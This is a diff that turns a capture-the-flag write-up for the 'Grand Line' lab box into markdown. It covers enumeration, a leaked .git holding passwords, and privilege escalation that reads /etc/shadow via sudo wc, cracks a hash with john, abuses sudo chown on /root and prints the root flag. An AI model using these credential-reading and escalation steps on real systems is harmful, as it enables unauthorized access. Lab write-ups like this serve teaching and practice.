@@ -1,5 +1,7 @@
-Grand Line
+# Grand Line
 
+## Enumeration
+```bash
 └─$ nmap  -sV -A -p- -sC  10.10.6.171
 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-22 11:21 BST
 Nmap scan report for 10.10.6.171
@@ -95,12 +97,17 @@ server-status           [Status: 403, Size: 276, Words: 20, Lines: 10, Duration:
 .htaccess               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 33ms]
 .htpasswd               [Status: 403, Size: 276, Words: 20, Lines: 10, Duration: 34ms]
 :: Progress: [20469/20469] :: Job [2/2] :: 1169 req/sec :: Duration: [0:00:19] :: Errors: 0 ::
+```
+### I download the .git and check around it if I can find something
 
-
+## Exploitation
+```bash
 git checkout e03a7b5c40fd2d3d58e9b0db0c0f4292a1009900
-
-
-└─$ cat app.py 
+```
+```bash
+└─$ cat app.py
+```
+```python 
 from flask import Flask, render_template, request
 
 app = Flask(__name__)
@@ -138,20 +145,34 @@ def forgot():
     return render_template('forgot.html')
 
 app.run(host='0.0.0.0',port=8081)
-
-luffy : ThisIsNotMyPassword
-
+```
+### I got 2 passwords after the research but only zorro works
+```bash
 {"username":"zoro","password":"1_G07_L0S7_0Nc3_4G41n"}
 
 {"username":"luffy","password":"ThisIsNotMyPassword"}
+```
+### I go on the ssh of zorro
 
+## User FLAG
+
+I forgot to write it :(
+
+## Privilege Escalation
+```bash
 zoro@grandline:~$ sudo wc --files0-from "/etc/shadow"
 wc: '
 root:$6$hUGaBuNk$VROksV2vkl8C8Bc51SsdJ0YCp5xa1A6evIlPfQC802JBxvMROcDH04WEDij3fxo8dGSO6ObTy5sV16tUaaO.o.:18720:0:99999:7:::
 'luffy:$6$Qin3OaoK$zPDgzM0Fxptmoe6jPgGI.MpAV4cnZOBY6yVq6IQ9TiGVAXt4O04Vi9pmF.PBJDsTzFxAzQZW5S3tyyw0xa.ji/:19053:0:99999:7:::
-
+```
+### I brute force the luffy password with john
+```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash_luffy
-
+```
+### On the luffy ssh session there is a specific right on the chown binary, so I use it
+```bash
 sudo chown luffy:luffy /root
+```
+## Root FLAG
 
-cat root/thisIsATreasureDidYouExpectRootDotTXT.txt : EPI{r_W3_Phri3nD2_0R_ph032_7h@_KInd_0F_7Hin9_J00_D3CiD3_J00R53lv32}
+```cat root/thisIsATreasureDidYouExpectRootDotTXT.txt``` : EPI{r_W3_Phri3nD2_0R_ph032_7h@_KInd_0F_7Hin9_J00_D3CiD3_J00R53lv32}
